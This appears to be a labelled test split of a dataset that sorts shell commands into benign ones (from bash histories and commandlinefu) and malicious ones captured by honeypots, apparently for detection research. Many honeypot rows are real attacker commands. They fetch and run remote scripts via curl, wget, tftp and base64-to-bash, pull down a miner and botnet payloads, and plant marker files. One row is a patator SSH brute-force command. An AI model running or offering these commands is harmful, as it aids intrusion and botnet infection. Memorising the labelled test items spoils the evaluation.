id,command,label,source,split
d2_008471,ci ./concatAxoFastqFilesSingleOneLane.sh,0,bash_history,test
d2_008474,/bin/busybox echo -e '\x47\x72\x6f\x70/dev' > /dev/.nippon,1,honeypot,test
d2_008496,biteme,1,honeypot,test
d2_008498,"find . -type f -name ""*\?*"" | while read f;do mv ""$f"" ""${f//[^0-9A-Za-z.\/\(\)\ ]/_}"";done",0,commandlinefu,test
d2_008500,glances,0,bash_history,test
d2_008506,killSTDIN,1,honeypot,test
d2_008512,push master,0,bash_history,test
d2_008516,/bin/busybox echo -e '\x47\x72\x6f\x70/proc/sched_debug' > /proc/sched_debug/.nippon,1,honeypot,test
d2_008519,mv sqa-portal-cdb_cert_chain.crt bk.sqa-portal-cdb_cert_chain.crt,0,bash_history,test
d2_008520,>.dropper,1,honeypot,test
d2_008532,blkid /dev/sda7,0,commandlinefu,test
d2_008539,rm -rf paypal.zip,0,bash_history,test
d2_008550,wget http://h17af57ca.example.net/mips,1,honeypot,test
d2_008551,ps axf,1,honeypot,test
d2_008552,rm -fr axo_*,0,bash_history,test
d2_008555,./PVvwiRW0,1,honeypot,test
d2_008556,"df -P | awk '$6==""/media/KINGSTON"" {print $1}'",0,commandlinefu,test
d2_008562,\rm Evanescence\ -\ Bring\ Me\ To\ Life,0,bash_history,test
d2_008570,tftp -r tftp2.sh -g 168.75.91.155,1,honeypot,test
d2_008571,ls boot,0,bash_history,test
d2_008574,"gophpdoc() { if [ $# -lt 2 ]; then echo $0 '< file > < title > [ pdf ]'; return; fi; if [ ""$3"" == 'pdf' ]; then ot=PDF:default:default; else ot=HTML:frames:earthli; fi; phpdoc -o $ot -f ""$1"" -t docs -ti ""$2"" }",0,commandlinefu,test
d2_008576,printf '%(%FT%T)T\n' 1606752450,0,commandlinefu,test
d2_008577,"cat file | tr ""\n"" "" """,0,commandlinefu,test
d2_008583,/bin/busybox rm -f /sys/fs/cgroup/.nippon,1,honeypot,test
d2_008586,ls -ltr config/testing-config.yaml,0,bash_history,test
d2_008587,cp profile profile1,0,bash_history,test
d2_008590,"iptables -I INPUT 2 -m --state RELATED,ESTABLISHED -j ACCEPT",0,bash_history,test
d2_008594,cd /tt,1,honeypot,test
d2_008595,cc bankersalgorithm.c,0,bash_history,test
d2_008605,find . -wholename './.snapshot' -prune -o -print,0,commandlinefu,test
d2_008606,for i in `find -L /var/ -wholename \*log\* -type d`; do COUNT=`ls -1U $i | wc -l`; if [ $COUNT -gt 10 ]; then echo $i $COUNT; fi; done,0,commandlinefu,test
d2_008610,echo jair pires | tr 'a-z''A-Z',0,bash_history,test
d2_008611,syscoind -datadir=2 getpeerinfo,0,bash_history,test
d2_008617,wget -qO- /dev/null http://h9c90fd6a.example.net/ip,1,honeypot,test
d2_008621,curl http://h0180f604.example.net/imgtemplate/online.php | sh,1,honeypot,test
d2_008631,snmpwalk -Os -Of -c lctro -v2c localhost 17.22.142.185.155.40.209.20.1.10.3,0,bash_history,test
d2_008633,/bin/busybox rm -f /tmp/.nippon,1,honeypot,test
d2_008634,neuauf.de]$ bash: [goalador@gatabash: bash:: command not found,0,bash_history,test
d2_008638,host sonar.si.francetelecom.fr,0,bash_history,test
d2_008644,tftp -l usb_ver -r dlr.arm -g 197.169.175.224,1,honeypot,test
d2_008648,ls index*,0,bash_history,test
d2_008653,"find . -name ""*.sh""|xargs grep wecb",0,bash_history,test
d2_008659,wget ftp://hfc1ab073.example.net/miner.tar,1,honeypot,test
d2_008671,sudo slurm,0,bash_history,test
d2_008675,url -fsSL http://h7642432e.example.net/2start.jpg | bash -sh,1,honeypot,test
d2_008681,"java -versop,",0,bash_history,test
d2_008687,sudo apt install git gitk git-pendaleyexo@gmail.com,0,bash_history,test
d2_008692,"df -h | grep -v ^none | ( read header ; echo ""$header"" ; sort -rn -k 5)",0,commandlinefu,test
d2_008712,pwgen 30 1,0,commandlinefu,test
d2_008714,sh 3Update.sh,1,honeypot,test
d2_008715,"for i in *; do sum=$(md5sum $i); mv -- ""$i"" ""${sum%% *}""; done",0,commandlinefu,test
d2_008731,pv /dev/urandom -L 3m -i 0.3 > /dev/null,0,commandlinefu,test
d2_008740,ls ~/workspace/niconico-ranking-rss,0,bash_history,test
d2_008743,ls /etc/sudoers -alt,0,bash_history,test
d2_008744,CLASSPATH=launcher.jar,0,bash_history,test
d2_008751,wget http://h21622c07.example.net/httpdlogic.sh,1,honeypot,test
d2_008766,shutdown now,0,bash_history,test
d2_008768,base64 --decode .threatstackcloudsecops | bash,1,honeypot,test
d2_008770,raspistill -o sam.jpg,0,bash_history,test
d2_008775,speedtest.net server has the lowest latency,1,honeypot,test
d2_008780,ls master-pieces,0,bash_history,test
d2_008781,django-admin startproject EstateAgent,0,bash_history,test
d2_008785,mkdir MySQL,0,bash_history,test
d2_008791,do echo $i,1,honeypot,test
d2_008794,radio.printDetails(),0,bash_history,test
d2_008796,vim archives/ppgsigc/cfg/cfg.d/z_local_eprints_fields.pl,0,bash_history,test
d2_008802,"ps -ef | grep jav[a] | awk '{print substr($1,1),substr($2,1),substr($0,index($0,""-Xms""),7),substr($0,index($0,""-Xmx""),7)}'",0,commandlinefu,test
d2_008811,tftp -r zatoempire2.sh -g parabellum.ddnsgeek.com,1,honeypot,test
d2_008815,/bin/busybox cat /var/tmp/.nippon,1,honeypot,test
d2_008820,xmllint --noout some.xml 2>&1 >/dev/null || exit 1,0,commandlinefu,test
d2_008825,tar -xzvf perr,1,honeypot,test
d2_008830,git branch -d MediaModul,0,bash_history,test
d2_008833,host kibana-divisu-rec.metriks.hbx.geo.francetelecom.fr,0,bash_history,test
d2_008839,directory.py |less,0,bash_history,test
d2_008841,git config --get-regex alias,0,bash_history,test
d2_008847,docker-machine env default,0,bash_history,test
d2_008856,wget -q http://h3395bedc.example.net -O- | sudo apt-key add -,0,commandlinefu,test
d2_008858,ldd <executable binary>,0,commandlinefu,test
d2_008865,man -t UNIX_COMMAND | open -f -a preview,0,commandlinefu,test
d2_008867,sudo pacman -Rns virtualbox-host-modules,0,bash_history,test
d2_008877,cat z2s234.x86 > ssh-updater,1,honeypot,test
d2_008880,vim character.cpp,0,bash_history,test
d2_008881,open learning.dvi &,0,bash_history,test
d2_008898,systemctl kill vmware-hostd.service,0,bash_history,test
d2_008901,tar czv file1 file2 folder1 | ssh user@server tar zxv -C /destination,0,commandlinefu,test
d2_008903,vim matching_data.thrift,0,bash_history,test
d2_008908,"printf ""%s\t%s\t%s\n"" {1..9} '*' 0 '#'",0,commandlinefu,test
d2_008928,mkdir -p /root/.ssh/,1,honeypot,test
d2_008936,trizen -Ss talloc,0,bash_history,test
d2_008948,admin123,1,honeypot,test
d2_008952,rm -rf miner.tar,1,honeypot,test
d2_008959,netstat -naop | grep 3306,0,bash_history,test
d2_008961,rm -rf ~/ps*,1,honeypot,test
d2_008970,"sudo iwconfig wlan0 essid ""room602"" key ""liu567890""",0,bash_history,test
d2_008973,"echo 'mail -s ""Call your wife"" 13125551234@tmomail.net' |at now+15min",0,commandlinefu,test
d2_008976,man vi,0,bash_history,test
d2_008979,wget http://h44f1d617.example.net/irc/bnc.tgz,1,honeypot,test
d2_008980,ls -l `find . -maxdepth 1 -type l -print`,0,commandlinefu,test
d2_008985,javac Problem.java,0,bash_history,test
d2_008986,./server_unit_test.py -s ./server -t test_query_string_9,0,bash_history,test
d2_008990,vim fadingPWM.sh,0,bash_history,test
d2_008994,git rebase -- continue,0,bash_history,test
d2_008995,cd /home/admin,1,honeypot,test
d2_009003,ldapsearch -x,0,bash_history,test
d2_009011,strace -f -s 512 -v ls -l,0,commandlinefu,test
d2_009014,vi Dockerfile,0,bash_history,test
d2_009023,cut -d/ -f2 /etc/passwd,0,bash_history,test
d2_009031,sh bin,0,bash_history,test
d2_009040,vi php.ini,0,bash_history,test
d2_009043,nano main.h,0,bash_history,test
d2_009052,sudo nano edx-platform/lms/envs/common.py,0,bash_history,test
d2_009054,LC_ALL=C /var/tmp/knrm,1,honeypot,test
d2_009056,ll -p,0,bash_history,test
d2_009061,nslookup www.sony.com localhost,0,bash_history,test
d2_009067,rm dbback.sh~ .dbback.sh.un~,0,bash_history,test
d2_009070,bash -c ./bMtNqIsh,1,honeypot,test
d2_009071,uniq -cd teste-uniq.txt,0,bash_history,test
d2_009076,cat dist.female.first | cut -d' ' -f1,0,bash_history,test
d2_009079,wgetsercontent.com/edx/configuration/$OPENEDX_RELEASE/util/install/ansible-bootstrap.sh -O - | sudo bash,0,bash_history,test
d2_009092,trizen -Ss emacs,0,bash_history,test
d2_009098,LC_ALL=C /tmp/v1m26ob1crmamf1a5diat3hurk,1,honeypot,test
d2_009108,./execute.py --exe src/snap --np 8 --fi qasnap/center_src/in08 --fo out/out08 > out/out08_time.txt,0,bash_history,test
d2_009114,rm MATEUS.txt,0,bash_history,test
d2_009115,mmv newcert newcerts,0,bash_history,test
d2_009117,oc new-app abi-tasks-dev/tasks:0.0 --name=tasks-green --allow-missing-imagestream-tags=true -n abi-tasks-prod,0,bash_history,test
d2_009120,podwebserver& sleep 2; elinks 'http://h99cc79b9.example.net',0,commandlinefu,test
d2_009123,mpd,0,bash_history,test
d2_009125,sh Pemex.sh,1,honeypot,test
d2_009129,sudo iptables L,0,bash_history,test
d2_009132,rm -rf xx,1,honeypot,test
d2_009136,cat /usr/include/san.h,1,honeypot,test
d2_009145,git push -u origin master,0,bash_history,test
d2_009149,$php_dir/bin/php -i | grep configure,0,commandlinefu,test
d2_009164,free -ht --si,0,commandlinefu,test
d2_009166,"for i in `openstack baremetal node list -c UUID -f value`; do openstack baremetal introspect data save $i | jq "".inventory.interfaces"" ; done",0,bash_history,test
d2_009171,"parse_rpm() { RPM=$1;B=${RPM##*/};B=${B%.rpm};A=${B##*.};B=${B%.*};R=${B##*-};B=${B%-*};V=${B##*-};B=${B%-*};N=$B;echo ""$N $V $R $A""; }",0,commandlinefu,test
d2_009173,mv ./-filename filename,0,commandlinefu,test
d2_009177,scp -t .,1,honeypot,test
d2_009181,openstack stack delete,0,bash_history,test
d2_009185,vi laplace_my_mpi.c,0,bash_history,test
d2_009195,sudo vim modules,0,bash_history,test
d2_009199,wcalc -q <<< '3/5',0,commandlinefu,test
d2_009201,/bin/busybox cat /etc/hostname/.none,1,honeypot,test
d2_009203,ls -a /run/,0,bash_history,test
d2_009205,head /isiseqruns/RonAxoTrinity/091113_Axo2PE_Eva/s_1_1/s_1_1.fq,0,bash_history,test
d2_009209,"awk '{print $1}' ""/proc/modules"" | xargs modinfo | awk '/^(filename|desc|depends)/'",0,commandlinefu,test
d2_009211,n(){ s=$[s^s<<13];s=$[s^s>>17];s=$[s^s<<5];echo $[s&2**32-1]; },0,commandlinefu,test
d2_009212,i=(*);echo ${i[RANDOM%(${#i[@]}+1)]]},0,commandlinefu,test
d2_009220,find -name voy_math_test,0,bash_history,test
d2_009224,wpa_action,0,bash_history,test
d2_009225,vi composer.lock,0,bash_history,test
d2_009228,sudo dmidecode | grep Serial\ Number | head -n1,0,commandlinefu,test
d2_009232,rake db:migrate VERSION=0,0,bash_history,test
d2_009233,echo redes de computadores,0,bash_history,test
d2_009238,./vPV04VY1,1,honeypot,test
d2_009240,LC_ALL=C chattr -i -a ~/.dhpcd,1,honeypot,test
d2_009242,mkdir int-ca/db,0,bash_history,test
d2_009246,perl -pi -e's/foo/bar/g' file1 file2 fileN,0,commandlinefu,test
d2_009253,"echo 'Desktop SPAM!!!' | while read SPAM_OUT; do notify-send ""$SPAM_OUT""; done",0,commandlinefu,test
d2_009254,unzip '*.zip',0,commandlinefu,test
d2_009256,endScript() {,1,honeypot,test
d2_009257,sh awoo2.sh,1,honeypot,test
d2_009258,>/var/.t,1,honeypot,test
d2_009259,ls -ltr mir-36/trinity_out_dir/,0,bash_history,test
d2_009260,ls Backups/mysql/-k,0,bash_history,test
d2_009261,cat mikec_Run_CASAVA.sh,0,bash_history,test
d2_009263,sudo rebot,0,bash_history,test
d2_009267,xrandr LVDS1 --dpi 48,0,bash_history,test
d2_009275,wget NasaPaul.com/v.py,1,honeypot,test
d2_009277,cp -r pintos cd /../home/team13a/,0,bash_history,test
d2_009279,"for f in *.flv; do ffmpeg -y -i ""$f"" -f image2 -ss 10 -vframes 1 -an ""${f%.flv}.jpg""; done",0,commandlinefu,test
d2_009284,git checkout pintos/src/examples/,0,bash_history,test
d2_009285,./iZy535Wi,1,honeypot,test
d2_009295,/bin/busybox echo -e '\x50\x6f\x72\x74/proc/kcore' > /proc/kcore/.none,1,honeypot,test
d2_009297,echo 1000 > serial,0,bash_history,test
d2_009305,ls dh/run/,0,bash_history,test
d2_009314,./hcDwqCAU,1,honeypot,test
d2_009317,vi auth,0,bash_history,test
d2_009326,do >$a,1,honeypot,test
d2_009328,wscat -l ws://thegigabots.app.bigbang.io,0,bash_history,test
d2_009333,"sudo fgrep -rnw --include=\*.{c,h} '/usr/include/linux/' -e ""set_task_state""",0,bash_history,test
d2_009351,nano scanner.py,0,bash_history,test
d2_009352,tftp lastofservers.ddnsgeek.com:8088 -c get httpdlogic.sh,1,honeypot,test
d2_009365,echo $(</tmp/foo),0,commandlinefu,test
d2_009381,./GSB9BYlA,1,honeypot,test
d2_009399,cp -r * .??* /dest,0,commandlinefu,test
d2_009401,"googl () { curl -s -d ""url=${1}"" http://h50ed7453.example.net/api/url | sed -n ""s/.*:\""\([^\""]*\).*/\1\n/p"" ;}",0,commandlinefu,test
d2_009409,vi /etc/php.ini,0,bash_history,test
d2_009426,lsof -Pnl +M -i6:8080,0,commandlinefu,test
d2_009433,namei -m $(pwd),0,commandlinefu,test
d2_009439,vim grub,0,bash_history,test
d2_009447,perl perll,1,honeypot,test
d2_009450,x=1; while [ $x = 1 ]; do process=`pgrep -u username`; if [ $process ]; then x=0; fi; done; strace -vvtf -s 256 -p $process,0,commandlinefu,test
d2_009453,./example1.sh,0,bash_history,test
d2_009458,rm -rf ssh.sh,1,honeypot,test
d2_009459,catfish --fileman=nautilus --path=/home/<username> --hidden --method=find,0,commandlinefu,test
d2_009460,sudo dmidecode -t processor,0,commandlinefu,test
d2_009462,vim contents/fractals.tex,0,bash_history,test
d2_009466,mv *.sql ..,0,bash_history,test
d2_009468,sudo systemctl restart snmpd,0,bash_history,test
d2_009479,mplayer -vo fbdev -xy 1024 -fs -zoom /path/to/movie.avi,0,commandlinefu,test
d2_009480,"ssh-keygen -t rsa -b 4096 -C ""lauwillis@yahoo.com""",0,bash_history,test
d2_009481,split -p 'DROP TABLE IF EXISTS' dump.sql dump.sql-,0,commandlinefu,test
d2_009484,vim policy-routes,0,bash_history,test
d2_009485,"sed ""s/\([a-zA-Z]*\:\/\/[^ ]*\)\(.*\)/\<a href=\""\1\""\>\1\<\/a\>\2/""",0,commandlinefu,test
d2_009497,wget http://hce45964b.example.net/udp.pl,1,honeypot,test
d2_009502,/bin/busybox echo -e '\x50\x6f\x72\x74/tmp' > /tmp/.none,1,honeypot,test
d2_009522,tftp -r axistftp2.sh -g 192.2.63.134,1,honeypot,test
d2_009540,perl -pe 's|@|>|;s|.*||s if $.%4==3 || $.%4==0;close $ARGV if eof' axo_right.fq > axo_right.fa &,0,bash_history,test
d2_009555,"cd ~/wallpapers; feh --bg-fill ""$( ls | sort -R | head -n 1 )""",0,commandlinefu,test
d2_009562,rm -r build/,0,bash_history,test
d2_009563,patator ssh_login host=141.224.125.188 port=22 user=FILE0 0=user.lst password=FILE1 1=pass.lst -x ignore:mesg='Authentication failed.',0,commandlinefu,test
d2_009568,which,0,bash_history,test
d2_009569,git add HW/HW_7,0,bash_history,test
